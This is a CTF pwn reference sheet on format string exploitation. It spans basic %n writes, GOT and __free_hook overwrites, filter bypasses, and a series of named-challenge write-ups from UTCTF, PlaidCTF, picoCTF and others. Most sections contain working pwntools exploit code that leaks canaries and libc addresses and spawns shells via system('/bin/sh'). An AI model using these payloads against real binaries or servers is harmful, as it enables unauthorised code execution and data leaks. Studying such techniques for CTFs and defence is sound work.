# CTF Pwn - Format String Exploitation

## Table of Contents
- [Format String Basics](#format-string-basics)
- [Argument Retargeting (Non-Positional %n Trick)](#argument-retargeting-non-positional-n-trick)
- [Blind Pwn (No Binary Provided)](#blind-pwn-no-binary-provided)
- [Format String with Filter Bypass](#format-string-with-filter-bypass)
- [Format String Canary + PIE Leak](#format-string-canary--pie-leak)
- [__free_hook Overwrite via Format String (glibc < 2.34)](#__free_hook-overwrite-via-format-string-glibc--234)
- [.rela.plt / .dynsym Patching](#relaplt--dynsym-patching)
- [Format String for Game State Manipulation (UTCTF 2026)](#format-string-for-game-state-manipulation-utctf-2026)
- [Format String Saved EBP Overwrite for .bss Pivot (PlaidCTF 2015)](#format-string-saved-ebp-overwrite-for-bss-pivot-plaidctf-2015)
- [argv\[0\] Overwrite for Stack Smash Info Leak (HITCON CTF 2015)](#argv0-overwrite-for-stack-smash-info-leak-hitcon-ctf-2015)
- [Format String .fini_array Loop for Multi-Stage Exploitation (Codegate 2016)](#format-string-fini_array-loop-for-multi-stage-exploitation-codegate-2016)
- [__printf_chk Bypass with Sequential %p (VolgaCTF 2017)](#__printf_chk-bypass-with-sequential-p-volgactf-2017)
- [Leak + GOT Overwrite in Single printf Call (picoCTF 2017)](#leak--got-overwrite-in-single-printf-call-picoctf-2017)
- [Objective-C %@ Format Specifier Exploitation (SHA2017)](#objective-c--format-specifier-exploitation-sha2017)
- [strlen Integer Truncation Bypass (ASIS CTF Finals 2017)](#strlen-integer-truncation-bypass-asis-ctf-finals-2017)
- [printf_function_table Overwrite via Buffer Overflow (34C3 CTF 2017)](#printf_function_table-overwrite-via-buffer-overflow-34c3-ctf-2017)
- [scanf Format String on Stack Overwrite (TUCTF 2017)](#scanf-format-string-on-stack-overwrite-tuctf-2017)
- [Format String Exploit Through ROT13 Encoding (SunshineCTF 2018)](#format-string-exploit-through-rot13-encoding-sunshinectf-2018)
- [Format String in HTTP User-Agent for PIE Leak (X-MAS CTF 2018)](#format-string-in-http-user-agent-for-pie-leak-x-mas-ctf-2018)
- [Null-Byte Address Fragmentation in Small Buffers (FireShell 2019)](#null-byte-address-fragmentation-in-small-buffers-fireshell-2019)

---

## Format String Basics

- Leak stack: `%p.%p.%p.%p.%p.%p`
- Leak specific offset: `%7$p`
- Write value: `%n` (4-byte), `%hn` (2-byte), `%hhn` (1-byte), `%lln` (8-byte)
- GOT overwrite for code execution

**Write size specifiers (x86-64):**
| Specifier | Bytes Written | Use Case |
|-----------|---------------|----------|
| `%n` | 4 | 32-bit values |
| `%hn` | 2 | Split writes |
| `%hhn` | 1 | Precise byte writes |
| `%lln` | 8 | Full 64-bit address (clears upper bytes) |

**IMPORTANT:** On x86-64, GOT entries are 8 bytes. Using `%n` (4-byte) leaves upper bytes with old libc address garbage. Use `%lln` to write full 8 bytes and zero upper bits.

**Arbitrary read primitive:**
```python
def arb_read(addr):
    # %7$s reads string at address placed at offset 7
    payload = flat({0: b'%7$s#', 8: addr})
    io.sendline(payload)
    return io.recvuntil(b'#')[:-1]
```

**Arbitrary write primitive:**
```python
from pwn import fmtstr_payload
payload = fmtstr_payload(offset, {target_addr: value})
```

**Manual GOT overwrite (x86-64):**
```python
# Format: %<value>c%<offset>$lln + padding + address
# Address at offset 8 when format is 16 bytes

win = 0x4011f6
target_got = 0x404018  # e.g., printf@GOT

fmt = f'%{win}c%8$lln'.encode()  # Write 'win' chars then store to offset 8
fmt = fmt.ljust(16, b'X')        # Pad to 16 bytes (2 qwords)
payload = fmt + p64(target_got)  # Address lands at offset 6 + 16/8 = 8

# Note: This prints ~4MB of spaces - be patient waiting for output
```

**Offset calculation for addresses:**
- Buffer typically starts at offset 6 (after register args)
- If format string is padded to N bytes, addresses start at offset: `6 + N/8`
- Example: 16-byte format → addresses at offset 8
- Example: 32-byte format → addresses at offset 10
- Example: 64-byte format → addresses at offset 14

**Verify offset with test payload:**
```python
# Put known address after N-byte format, check with %<calculated_offset>$p
test = b'%8$p___XXXXXXXXX'  # 16 bytes
payload = test + p64(0xDEADBEEF)
# Should print 0xdeadbeef if offset 8 is correct
```

**GOT target selection:**
- If `exit@GOT` doesn't work, try other GOT entries
- `printf@GOT`, `puts@GOT`, `putchar@GOT` are good alternatives
- Target functions called AFTER the format string vulnerability
- Check call order in disassembly to pick best target

**Key insight:** Format string vulnerabilities are identified by sending `%p.%p.%p` as input -- if hex addresses appear in the output, the program passes user input directly as the format argument to `printf`/`sprintf`. This gives both arbitrary read (`%s` with a target address) and arbitrary write (`%n` family) primitives.

## Argument Retargeting (Non-Positional %n Trick)

Use this when you cannot embed addresses (input filtering, newline issues) but can still use `%n` and a stack pointer is available as an argument.

**Key idea:** Non-positional specifiers consume arguments in order. You can overwrite a *future* argument (which is itself a pointer) before it is used, then use it as an arbitrary write target.

**Why non-positional:** Positional formats (`%22$hn`) are cached up front by glibc, so changing the underlying stack slot after parsing won’t change the pointer. Non-positional `%n` avoids that cache.

**Workflow (example):**
1. Leak offsets: find a stack pointer argument you can overwrite (e.g., saved `rbp` on the stack).
2. Advance the argument index with `%c` (each `%c` consumes one argument).
3. Use `%n` to write a 4-byte value into that pointer slot (e.g., make arg22 point to `exit@GOT`).
4. Print additional chars and use `%hn` to write the low 2 bytes to the now-retargeted pointer.

**Pattern (conceptual):**
```text
%c%c%c...%c      # consume args to reach pointer slot
%<big>c%n        # overwrite pointer slot to target_addr (e.g., exit@GOT)
%<delta>c%hn     # write low 2 bytes of win to that GOT entry
```

**Compute widths:**
- After writing `target_addr` with `%n`, the printed count is `C`.
- To write low 2 bytes `W` with `%hn`, print:
  - `delta = (W - (C % 65536)) mod 65536`

**When it works well:**
- No PIE / Partial RELRO (GOT writable)
- You can afford large outputs (millions of chars)

**Stack layout discovery (find your input offset):**
```text
%1$p %2$p %3$p ... %50$p
```
- Your input appears at some offset (commonly 6-8)
- Canary: looks like `0x...00` (null byte at end)
- Saved RBP: stack address pattern
- Return address: code address (PIE or libc)

## Blind Pwn (No Binary Provided)

When no binary is given, use format strings to discover everything:

**1. Confirm vulnerability:**
```text
> %p-%p-%p-%p
0x563b6749100b-0x71-0xffffffff-0x7ffff9c37b80
```

**2. Discover protections by leaking stack:**
- Find canary (offset ~39, pattern `0x...00`)
- Find saved RBP (offset ~40, stack address)
- Find return address (offset ~41-43, code pointer)

**3. Identify PIE base:**
- Leak return address pointing into main/binary
- Subtract known offset to get base (may need guessing)

**4. Dump GOT to identify libc:**
```python
# Read GOT entries for known functions
puts_addr = arb_read(pie_base + got_puts_offset)
stack_chk_addr = arb_read(pie_base + got_stack_chk_offset)
```

**5. Cross-reference libc database:**
- https://libc.blukat.me/
- https://libc.rip/
- Input multiple function addresses to identify exact libc version

**Key insight:** Blind pwn without a binary requires systematic discovery: leak stack values to find canary/PIE/libc pointers, use arbitrary read to dump GOT entries, cross-reference leaked addresses against libc databases to identify the exact version, then compute offsets for one_gadget or system().

**6. Calculate libc base:**
```python
# From leaked __libc_start_main return or similar
libc.address = leaked_ret_addr - known_offset
```

**Common stack offsets (x86_64):**
| Offset | Typical Content |
|--------|-----------------|
| 6-8 | User input buffer |
| ~39 | Stack canary |
| ~40 | Saved RBP |
| ~41-43 | Return address |

## Format String with Filter Bypass

**Pattern (Cvexec):** `filter_string()` strips `%` but skippable with `%%%p`.

**Filter bypass:** If filter checks adjacent chars after `%`:
- `%p` → filtered
- `%%p` → properly escaped (prints literal `%p`)
- `%%%p` → third `%` survives, prints stack value

**GOT overwrite via format string (byte-by-byte with `%hhn`):**
```python
# Write last 3 bytes of debug() addr to strcmp@GOT across 3 payloads
# Pad address to consistent stack offset (e.g., 14th position)
for byte_offset in range(3):
    target = got_strcmp + byte_offset
    byte_val = (debug_addr >> (byte_offset * 8)) & 0xff
    # Calculate chars to print, accounting for previous output
    payload = f"%%%dc%%%d$hhn" % (byte_val - prev_written, 14)
    payload = payload.encode().ljust(48, b'X') + p64(target)
```

## Format String Canary + PIE Leak

**Pattern (My Little Pwny):** Format string vulnerability to leak canary and PIE base, then buffer overflow.

**Two-stage attack:**
```python
# Stage 1: Leak via format string
io.sendline(b'%39$p.%41$p')  # Canary at offset 39, return addr at 41
leak = io.recvline()
canary = int(leak.split(b'.')[0], 16)
pie_base = int(leak.split(b'.')[1], 16) - known_offset

# Stage 2: Buffer overflow with known canary
win = pie_base + win_offset
payload = b'A' * buf_size + p64(canary) + p64(0) + p64(win)
io.sendline(payload)
```

## __free_hook Overwrite via Format String (glibc < 2.34)

**Pattern (Notetaker, PascalCTF 2026):** Full RELRO + No PIE + format string vulnerability. Can't overwrite GOT, but `__free_hook` is writable.

**Key insight:** `free(ptr)` passes `ptr` in `rdi` as first argument. If `__free_hook = system`, then `free("cat flag")` executes `system("cat flag")`.

```python
# 1. Leak libc via format string
p.sendline(b'%43$p')  # __libc_start_main return address
libc_base = int(leaked, 16) - LIBC_START_MAIN_RET_OFFSET

# 2. Write system() address to __free_hook
free_hook = libc_base + libc.symbols['__free_hook']
system_addr = libc_base + libc.symbols['system']
payload = fmtstr_payload(8, {free_hook: system_addr}, write_size='byte')

# 3. Trigger: send command as menu input, program calls free(input_buffer)
p.sendline(b'cat flag')  # free() → system("cat flag")
```

**When to use:** Full RELRO (no GOT overwrite) + glibc < 2.34 (hooks still exist). For glibc >= 2.34, hooks are removed - target return addresses or `_IO_FILE` structs instead.

## .rela.plt / .dynsym Patching

**When to use:** GOT addresses contain bad bytes (e.g., 0x0a with fgets), making direct GOT overwrite impossible. Requires `.rela.plt` and `.dynsym` in writable memory.

**Technique:** Patch `.rela.plt` relocation entry symbol index to point to different symbol, then patch `.dynsym` symbol's `st_value` with `win()` address. When the original function is called, dynamic linker reads patched relocation and jumps to `win()`.

```python
# Key addresses (from readelf -S)
REL_SYM_BYTE = 0x4006ec   # .rela.plt[exit].r_info byte containing symbol index
STDOUT_STVAL_LO = 0x4004e8  # .dynsym[11].st_value low halfword
STDOUT_STVAL_HI = 0x4004ea  # .dynsym[11].st_value high halfword

# Format string writes via %hhn (8-bit) and %hn (16-bit)
# 1. Write symbol index 0x0b to r_info byte
# 2. Write win() address low halfword to st_value
# 3. Write win() address high halfword to st_value+2
```

**When GOT has bad bytes but .rela.plt/.dynsym don't:** This technique bypasses all GOT byte restrictions since you never write to GOT directly.

**Key insight:** When GOT addresses contain bad bytes (e.g., `0x0a` with `fgets`), avoid writing to GOT directly. Instead, patch `.rela.plt` to redirect the relocation to a different `.dynsym` entry, then overwrite that symbol's `st_value` with the target address. The dynamic linker follows the patched chain on the next call.

---

## Format String for Game State Manipulation (UTCTF 2026)

**Pattern (Small Blind):** Poker/card game where player name is vulnerable to format string. Stack contains pointers to game state variables (player chips, dealer chips). Write arbitrary values to win condition.

**Key insight:** `%n` writes the number of characters printed so far. Use `%Xc` to control that count, then `%N$n` to write to the Nth stack argument (which points to a game variable).

**Exploitation:**
```python
from pwn import *

p = remote('challenge.utctf.live', 7255)
p.recvuntil(b'Enter your name: ')

# %1000c prints 1000 chars (padding), then %7$n writes 1000 to stack pos 7
# Stack position 7 = pointer to player_chips variable
p.sendline(b'%1000c%7$n')

# Player now has 1000 chips → triggers win condition
# Collect flag from game output
```

**Discovery workflow:**
1. **Confirm format string:** Send `%p.%p.%p.%p` as name, check for hex leaks
2. **Map stack positions:** Try `%6$n`, `%7$n`, `%8$n` with different `%Xc` values
3. **Identify which variable changed:** Compare game output (chips, score, health) before/after
4. **Determine win condition:** May be `player_chips >= threshold` or `player > dealer`
5. **Craft winning payload:** Set player chips high (`%9999c%7$n`) or dealer chips to 0 (`%6$n`)

**Common game state patterns on stack:**
| Position | Typical Variable |
|----------|-----------------|
| 6 | Pointer to dealer/opponent state |
| 7 | Pointer to player state |
| 8-10 | Score, health, inventory |

**When `%n` writes to adjacent variables:** If player and dealer chips are adjacent in memory (4 bytes apart), positions N and N+1 point to them. Write 0 to dealer (`%N$n` with 0 chars printed) and high value to player (`%9999c%(N+1)$n`).

**Key insight:** Format string vulnerabilities in game binaries are simpler than typical pwn — you don't need shell, just manipulate game state to trigger the win condition. Map stack positions to game variables, then write the winning values.

---

## Format String Saved EBP Overwrite for .bss Pivot (PlaidCTF 2015)

**Pattern (EBP):** Format string buffer is in `.bss` (fixed address) rather than on the stack. Classic `%n` arbitrary-write requires attacker addresses on the stack, which is impossible with `.bss` buffers. Instead, overwrite the saved EBP to redirect the function epilogue (`leave; ret`) to the `.bss` buffer.

**How `leave; ret` works:**
```asm
leave:  mov esp, ebp    ; esp = saved_ebp
        pop ebp         ; ebp = [saved_ebp]
ret:    pop eip         ; eip = [saved_ebp + 4]
```

**Exploit layout in `.bss` buffer at address `0x0804A080`:**
```text
[addr_of_buf-4][padding_to_write_value][%n][shellcode...]
```
Write `buf_addr - 4` (e.g., `0x0804A07C`) into saved EBP via `%n`. On function return, `leave` sets `esp = 0x0804A07C`, then `ret` jumps to the value at `0x0804A080` — the start of shellcode.

**Key insight:** When the format string buffer is at a fixed `.bss` address (not stack), overwrite saved EBP to pivot the stack into `.bss`. The `leave; ret` epilogue uses EBP to set ESP, so controlling EBP controls where `ret` reads EIP from. Place shellcode address (or ROP chain) at `buf_addr` and shellcode at `buf_addr + offset`.

---

## argv[0] Overwrite for Stack Smash Info Leak (HITCON CTF 2015)

**Pattern (nanana):** When a stack canary is corrupted, glibc's `__stack_chk_fail` prints: `*** stack smashing detected ***: <argv[0]> terminated`. Since `argv[0]` is a pointer stored on the stack, overwriting it with the address of a secret (e.g., global password buffer) leaks the secret through the crash message.

**Attack steps:**
1. Overflow past the canary (deliberately corrupting it)
2. Continue overwriting the stack to reach `argv[0]` (pointer to program name)
3. Replace `argv[0]` with the address of the target data (e.g., `0x601090` = `g_password`)
4. The stack smash handler prints: `*** stack smashing detected ***: <password_contents>`

```python
# Overflow to overwrite argv[0] with address of global password
payload = b"A" * canary_offset     # reach canary (deliberately corrupt it)
payload += b"B" * (argv0_offset - canary_offset)  # padding to argv[0]
payload += p64(password_addr)      # overwrite argv[0] -> password string
```

**Key insight:** A "failed" exploit that triggers `__stack_chk_fail` becomes an information leak when `argv[0]` is overwritten. This is useful as a first stage: leak a secret (password, canary, address), then use it in a second connection for the real exploit. Works because `argv` is stored on the stack above local variables.

---

## Format String .fini_array Loop for Multi-Stage Exploitation (Codegate 2016)

**Pattern:** When no GOT function is called after `printf()`, chain multiple format string writes across re-executions by overwriting `.fini_array` with `main()`:

1. **Stage 1:** Overwrite `.fini_array[0]` with `main()`, leak libc + stack pointers
2. **Stage 2:** Overwrite `printf@GOT` with `system()`, overwrite `__stack_chk_fail@GOT` with `main()`
3. **Stage 3:** Deliberately corrupt stack canary so `__stack_chk_fail` re-enters `main()`. Now `printf(input)` is `system(input)` -- send `/bin/sh`

```python
# Stage 1: loop back via .fini_array, leak addresses
payload = fmtstr_payload(offset, {fini_array: main_addr})
# Stage 2: redirect printf to system, set up canary fail re-entry
payload = fmtstr_payload(offset, {printf_got: system, stack_chk_got: main_addr})
# Stage 3: corrupt canary -> __stack_chk_fail -> main -> system(input)
```

**Key insight:** `.fini_array` entries are called when `main()` returns. Overwriting with `main()` creates an execution loop for multi-stage format string attacks. Deliberately corrupting the canary triggers `__stack_chk_fail` as a controlled re-entry vector when that GOT entry has been redirected.

**References:** Codegate 2016

---

## __printf_chk Bypass with Sequential %p (VolgaCTF 2017)

**Pattern:** `__printf_chk()` blocks `%n` writes and direct parameter access (`%123$p`). Bypass by chaining sequential `%p` specifiers to reach the desired stack offset.

```python
from pwn import *

# __printf_chk restrictions:
# - No %n/%hn/%hhn writes
# - No direct access: %123$p fails
# - Sequential access still works: %p%p%p...

# Leak canary at stack offset 267:
payload = "%p." * 267 + "%p"  # sequential %p to offset 267
io.sendline(payload.encode())
response = io.recvline().decode()
leaks = response.split(".")
canary = int(leaks[266], 16)  # 267th value (0-indexed)

# Leak libc return address at offset 269:
payload = "%p." * 269 + "%p"
io.sendline(payload.encode())
response = io.recvline().decode()
leaks = response.split(".")
libc_ret = int(leaks[268], 16)
libc_base = libc_ret - known_offset

# Then use stack overflow for ROP since format string write is blocked
payload = b"A" * buf_size
payload += p64(canary)
payload += p64(0)           # saved rbp
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(system_addr)
io.sendline(payload)
```

**Key insight:** While `__printf_chk` prevents `%n` and direct parameter access (`%N$`), it still allows sequential format specifiers. Chaining hundreds of `%p` reaches any stack offset, enabling leaks (canary, libc, PIE) even without write capability. Combine with a separate overflow vulnerability for the write stage.

**When to recognize:** Binary uses `__printf_chk` or `__fprintf_chk` (visible in disassembly or via `__fortify_source`). Direct `%N$p` fails but sequential `%p%p%p...` still works. Output may be very large -- parse carefully with delimiters.

**References:** VolgaCTF 2017

---

## Leak + GOT Overwrite in Single printf Call (picoCTF 2017)

**Pattern:** When a format string vulnerability is followed immediately by `exit(0)`, combine address leak and GOT overwrite in a single printf invocation.

```python
from pwn import *

# Must leak libc AND redirect exit() in one printf call
# Layout: padding + dummy_addr + %leak$p + %Nc + %write$hn + padding + got_addr

exit_got = elf.got['exit']
main_addr = elf.sym['main']
target_low16 = main_addr & 0xFFFF

payload = b'e_______'                     # 8 bytes padding
payload += p64(0x4141414141)              # dummy (consumed by leak specifier)
payload += b' %25$p'                      # leak libc address at offset 25
# Calculate bytes needed: target_low16 - bytes_written_so_far
bytes_written = len(payload)
padding_needed = (target_low16 - bytes_written) % 0x10000
payload += f'%{padding_needed}c%19$hn'.encode()  # write low 2 bytes to offset 19
payload += b'A' * ((8 - (len(payload) % 8)) % 8) # alignment to 8 bytes
payload += p64(exit_got)                  # address for %19$hn write

# Result: leaks libc via %25$p AND overwrites exit@GOT via %19$hn
# exit() jumps back to main for second-stage exploitation
io.sendline(payload)

# Parse leaked libc address from output
io.recvuntil(b' 0x')
libc_leak = int(io.recv(12), 16)
libc_base = libc_leak - known_offset

# Second pass: now with libc known, overwrite for shell
# ...
```

**Key insight:** A single `printf` can perform both reads (`%p`) and writes (`%hn`) simultaneously. When `exit()` immediately follows the vulnerability, overwrite `exit@GOT` with `main`'s address in the same call that leaks libc, creating a re-entry point for full exploitation. The key is careful offset calculation so the leak specifier and write specifier reference the correct stack positions.

**When to recognize:** Format string vulnerability with only one shot before `exit()` or another terminating function. The single-call technique avoids needing a loop or re-entry mechanism before establishing one.

**References:** picoCTF 2017

---

## Objective-C %@ Format Specifier Exploitation (SHA2017)

**Pattern:** Objective-C's `NSLog` and related functions support the `%@` format specifier, which calls `objc_msg_lookup(rdi, ...)` treating the corresponding stack value as an Objective-C object pointer. Control the stack value pointed to by `%N$@` to control `rdi`. Analysis of `objc_msg_lookup` reveals a `call rax` gadget reachable with crafted conditions, enabling one-shot execution.

**Mechanism:**
```text
NSLog(@"Hello %@", user_input)
    → %@ consumes next argument from stack
    → argument is treated as Objective-C object pointer (rdi)
    → objc_msg_lookup(rdi, "description") is called
    → if [rdi+8] == 0 (ISA check fails), execution reaches: call rax
    → rax is under attacker control via the crafted "object"
```

**Exploitation:**
```python
# Craft a fake Objective-C object on the stack via format string write
# Object layout: [isa_ptr][method_list_ptr][...]
# Set isa_ptr = 0 to reach the call rax path in objc_msg_lookup
# Set rax = one_gadget or system() via prior %n writes

# Locate %N$@ position: stack offset where fake object pointer lands
# Use %n to write fake object address at the right stack slot
# Then trigger %@ to call objc_msg_lookup → call rax → shell
payload = b'%<distance>c%<write_offset>$lln'  # write fake obj addr
payload += b'%<obj_offset>$@'                  # trigger call rax
```

**Key insight:** Objective-C format strings include `%@` which invokes `objc_msg_lookup` on a stack pointer — turns a read-only FSB into a controlled-call primitive via the objc runtime. The `call rax` gadget inside `objc_msg_lookup` is reachable when the ISA pointer check fails, making a crafted "null ISA" object sufficient to redirect execution.

**References:** SHA2017

---

## strlen Integer Truncation Bypass (ASIS CTF Finals 2017)

**Pattern:** Binary filters format string input by checking that each character up to `strlen(input)+1` is lowercase. However, the `strlen()` result is cast to `int8_t`: at input length 255, `(int8_t)(255 + 1)` overflows to 0, collapsing the sanitization window to an empty range. Format specifiers like `%n` placed beyond byte 255 bypass the filter entirely.

**Vulnerable code pattern:**
```c
void filter(char *input) {
    int8_t len = (int8_t)strlen(input);  // truncates at 255 → wraps to -1 or 0
    for (int8_t i = 0; i <= len; i++) {  // at len==-1 (255 cast): 0 <= -1 is false
        if (!islower(input[i]))
            reject();
    }
}
```

**Exploitation:**
```python
# Pad with 255 lowercase bytes, then place %n-based payload starting at byte 255
# The filter checks bytes 0..len, but len wraps to -1 (or 0+1=0), so no bytes checked
filler = b'a' * 255
exploit_suffix = b'%7$n' + p64(target_addr)  # unchecked bytes
payload = filler + exploit_suffix
```

**Key insight:** `strlen()` cast to `int8_t` produces signed overflow at length 255, collapsing the sanitization window to zero. Any payload content placed at or beyond byte 255 escapes the filter. Always check for integer truncation when a length field is stored in a signed or short type.

**References:** ASIS CTF Finals 2017

---

## printf_function_table Overwrite via Buffer Overflow (34C3 CTF 2017)

**Pattern:** Exploit glibc's internal printf dispatch tables to turn a buffer overflow into an information leak without needing a format string vulnerability. When `printf_function_table` is non-NULL, glibc dispatches format specifiers through `printf_arginfo_table` instead of the default handlers.

**Mechanism:**
1. Buffer overflow to create a fake `printf_arginfo_size_function` structure pointing to `_fortify_fail`
2. Overwrite `__libc_argv` so `_fortify_fail` prints the flag instead of the real `argv[0]`
3. Set `printf_function_table` to a non-NULL value (triggers alternate dispatch)
4. Set `printf_arginfo_table` to point to the fake structure

**How the dispatch works:**
```c
// Inside glibc's printf implementation:
if (__printf_function_table != NULL) {
    // Alternate path: look up handler via printf_arginfo_table
    int spec_index = format_char;  // e.g., 'd' = 100
    // Calls printf_arginfo_table[spec_index](...)
    // → redirected to _fortify_fail
}

// _fortify_fail prints:
//   "*** buffer overflow detected ***: %s terminated\n", __libc_argv[0]
// If __libc_argv[0] points to the flag → flag is leaked
```

**Exploitation:**
```python
from pwn import *

# Addresses determined from libc
printf_function_table = libc_base + PRINTF_FUNCTION_TABLE_OFF
printf_arginfo_table = libc_base + PRINTF_ARGINFO_TABLE_OFF
libc_argv = libc_base + LIBC_ARGV_OFF
fortify_fail = libc_base + FORTIFY_FAIL_OFF

# Step 1: Overflow to overwrite __libc_argv to point to flag location
# Step 2: Create fake arginfo table entry pointing to _fortify_fail
# Step 3: Set printf_function_table to non-NULL
# Step 4: Set printf_arginfo_table to fake table

# Any subsequent printf with a format specifier (e.g., %d, %s)
# triggers: printf_arginfo_table['d'] → _fortify_fail
# _fortify_fail reads __libc_argv[0] → prints flag contents
```

**Key insight:** When `printf_function_table` is non-NULL, glibc dispatches format specifiers through `printf_arginfo_table`. Overwriting both lets you redirect any printf format specifier to an arbitrary function. Combined with `_fortify_fail` (which prints `__libc_argv[0]`), this turns a buffer overflow into an info leak without needing a format string vulnerability.

**When to recognize:** Buffer overflow that can reach glibc globals but no direct format string vulnerability. The target binary calls `printf` with format specifiers after the overflow. Useful when the goal is information exfiltration (flag leak) rather than code execution.

**References:** 34C3 CTF 2017

---

## scanf Format String on Stack Overwrite (TUCTF 2017)

**Pattern:** When `scanf`'s format string (e.g., `"%30s"`) is stored on the stack adjacent to the user input buffer rather than in `.rodata`, the first input can overflow into the format specifier itself, expanding the allowed read size for the next call.

**Two-stage overflow:**
```python
from pwn import *

# Stage 1: Overflow the scanf format string on the stack
# Format "%30s" is stored 0x14 bytes after the input buffer
# Overwrite it to become "%99s"
payload0 = b"0" * 0x14 + p32(0x73393925)  # 0x73393925 = "%99s" in little-endian
io.sendline(payload0)

# Stage 2: scanf now reads up to 99 bytes instead of 30
# Use the expanded buffer to reach and overwrite the return address
payload1 = b"0" * 0x31 + p32(win_addr)     # 0x31 bytes padding + return address
io.sendline(payload1)
```

**Stack layout:**
```text
+0x00: input_buffer[30]    ← scanf reads here
+0x14: format_string[4]    ← "%30s" (overwritten to "%99s")
  ...
+0x31: saved_ebp
+0x35: return_address       ← target for stage 2
```

**Key insight:** If the format specifier for `scanf` is on the stack (not in `.rodata`), the first input can overwrite it to expand the read size, then the second input uses the expanded format to reach the return address. Two-stage overflow: first expand the format string, then exploit the expanded buffer. Check whether format strings are stack-allocated by examining the disassembly — `lea` from `rbp`/`rsp` offset (stack) vs. `lea` from `rip`-relative address (`.rodata`).

**When to recognize:** Binary uses `scanf` with a format string that limits input length (e.g., `%30s`), but the overflow is just short of reaching the return address. If the format string is a local variable on the stack rather than a string literal, this two-stage technique bridges the gap.

**References:** TUCTF 2017

---

## Format String Exploit Through ROT13 Encoding (SunshineCTF 2018)

**Pattern:** A "ROT13 encryption service" applies ROT13 to user input before passing it to `printf`. Leak addresses and build format string payloads, but ROT13-encode them first so they survive the transformation and reach `printf` intact.

**Attack chain:**
1. Input is ROT13-encoded by the binary before reaching `printf`
2. ROT13 is self-inverse: `rot13(rot13(x)) = x`
3. Pre-encode format string payloads with ROT13 so the transformation produces the intended format specifiers
4. Leak libc and program addresses via ROT13-encoded `%p` specifiers
5. Build a `fmtstr_payload` to overwrite `strlen@GOT` with `system`, then send `/bin/sh`

```python
import codecs
from pwn import *

def rot13(s):
    return codecs.encode(s, 'rot_13')

io = remote('target', 1337)

# Stage 1: Leak addresses through ROT13 transform
# rot13('%2$x|%3$x') produces encoded string; after binary's rot13, printf sees '%2$x|%3$x'
io.sendline(rot13('%2$x|%3$x').encode())
leak = io.recvline().decode()
libc_leak, prog_leak = leak.split('|')
libc_base = int(libc_leak, 16) - known_offset
prog_base = int(prog_leak, 16) - known_offset

# Stage 2: Overwrite strlen@GOT with system via format string
strlen_got = prog_base + elf.got['strlen']
system_addr = libc_base + libc.symbols['system']
writes = {strlen_got: system_addr}
payload = fmtstr_payload(7, writes)

# ROT13-encode the entire payload so binary's rot13 produces the real fmt string
encoded_payload = rot13(payload.decode('latin-1')).encode('latin-1')
io.sendline(encoded_payload)

# Stage 3: Send /bin/sh -- strlen("/bin/sh") now calls system("/bin/sh")
io.sendline(b'/bin/sh')
io.interactive()
```

**Key insight:** When input is transformed before reaching printf (ROT13, Caesar, etc.), pre-encode the format string payload with the inverse transform. ROT13 is self-inverse, so `rot13(rot13(payload)) = payload` reaches printf intact. This applies to any invertible transformation applied before a format string sink -- XOR, base64, substitution ciphers, etc.

**References:** SunshineCTF 2018

---

## Format String in HTTP User-Agent for PIE Leak (X-MAS CTF 2018)

**Pattern:** A PIE-compiled HTTP server logs the `User-Agent` header with `printf(ua)`. No other info-leak primitives exist, but the stack canary and PIE base both sit near the logging frame. One request leaks both in a single response.

```python
# Leak canary at offset 6, PIE base at offset 7
r = requests.get('http://target/', headers={'User-Agent': '%6$p.%7$p'})
canary, pie = [int(x, 16) for x in r.text.strip().split('.')]
pie_base = pie - elf.sym['main']
```

**Key insight:** Any header parsed into a format-string sink turns a remote HTTP server into a leak oracle. Check logs, error messages, and reflected headers before assuming you need a binary-local primitive.

**References:** X-MAS CTF 2018 — I want that toy, writeup 12672

---

## Null-Byte Address Fragmentation in Small Buffers (FireShell 2019)

**Pattern:** The vulnerable buffer is 16 bytes, so a typical `fmtstr_payload(offset=..., writes={addr: val})` fails because `printf` stops at the first null byte in `addr`. Work around it by placing the format specifier *first* and the target address *last* in the buffer — printf consumes the format bytes before it hits the null.

```python
fmtstr = b"%9x%11$n" + b"\x20\x20\x60\x00\x00\x00\x00\x00"
# printf processes %9x%11$n using the address at offset 11 (the trailing 8 bytes)
# Writes 0x9 (from %9x count) to *0x602020
```

**Key insight:** Format-string null-byte restrictions only bite when the address precedes the format directives. Put the directives first so `printf` parses them before touching the address, then let `%$n` reference the trailing address slot.

**References:** FireShell CTF 2019 — casino, writeup 12916
